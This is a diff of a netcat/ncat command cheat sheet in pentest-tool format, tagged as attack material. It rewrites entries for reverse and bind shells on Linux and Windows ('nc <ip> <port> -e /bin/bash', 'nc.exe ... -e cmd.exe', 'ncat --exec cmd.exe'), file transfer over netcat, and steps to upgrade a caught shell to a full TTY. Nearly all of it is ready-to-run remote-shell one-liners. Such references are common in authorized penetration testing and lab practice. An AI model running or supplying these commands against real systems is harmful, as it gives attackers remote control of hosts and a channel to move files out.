@@ -3,68 +3,91 @@
 % nc, netcat
 
 #plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 
-## nc setup listener
+
+## reverse - linux listener (fixed port)
 ```
-nc -nlvp <lport>
+rlwrap -cAr nc -nlvp <port>
 ```
 
-## nc bind shell windows
-#plateform/windows 
+## reverse - linux listener (random port)
 ```
-nc -nlvp <port> -e cmd.exe
-```
-
-## nc bind shell linux
-#plateform/linux
-```
-nc -nlvp <port> -e /bin/bash
+rlwrap -cAr nc -lnvr
 ```
 
-## nc reverse shell windows
-#plateform/windows  #cat/ATTACK/REVERSE_SHELL 
+## reverse - windows listener 
 ```
-nc -nv <ip> <port> -e c:\windows\system32\cmd.exe
-```
-
-
-
-## nc reverse shell linux
-#plateform/linux #cat/ATTACK/REVERSE_SHELL 
-```
-nc -nv <ip> <port> -e /bin/bash
+nc.exe -lnvp <port>
 ```
 
-## nc transfer file - receiver
+## reverse - linux binder
+```
+nc -np <ip> <port> -e /bin/bash
+```
+
+## reverse - windows binder
+```
+nc.exe <ip> <port> -e cmd.exe
+```
+
+## bind - linux listener (fixed port)
+```
+rlwrap -cAr nc -nlvp <port> -e /bin/bash
+```
+
+## bind - linux listener (random port)
+```
+rlwrap -cAr nc -lnvr -e /bin/bash
+```
+
+## bind - windows listener 
+```
+nc.exe -lnvp <port>  -e cmd.exe
+```
+
+## bind - linux binder
+```
+nc -np <ip> <port>
+```
+
+## bind - windows binder
+```
+nc.exe <ip> <port>
+```
+
+## transfer - receiver
 #plateform/linux #cat/ATTACK/FILE_TRANSFERT 
 ```
 nc -nlvp <port> > <incomming_file>
 ```
 
-## nc transfer file - sender
+## transfer - sender
 #plateform/linux #cat/ATTACK/FILE_TRANSFERT 
 ```
 nc -nv <ip> <port> < <file_to_send>
 ```
 
-# ncat
-
-% ncat
-
-## ncat bind shell ssl filtered
-#plateform/linux #cat/ATTACK/LISTEN-SERVE 
+## full tty (1)  
 ```
-ncat --exec cmd.exe --allow <allowed_ip> -vnl <port> --ssl
+python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-## ncat bind shell ssl connection
-#plateform/linux #cat/ATTACK/LISTEN-SERVE 
+## full tty (2)
 ```
-ncat -v <ip> <port> --ssl
+CTRL+Z
+``` 
+
+## full tty (3)
+```
+stty raw -echo ; fg
 ```
 
-## ncat HTTP WEB proxy
-#plateform/linux #cat/ATTACK/LISTEN-SERVE 
+## full tty (4)
+TERM=screen
 ```
-ncat --listen --proxy-type http <port>
+export SHELL=/bin/bash; export TERM=xterm-256color ; stty rows <ROWS|38> cols <COLS|116>; reset
 ```
 
+## no tty
+```
+see expect
+```
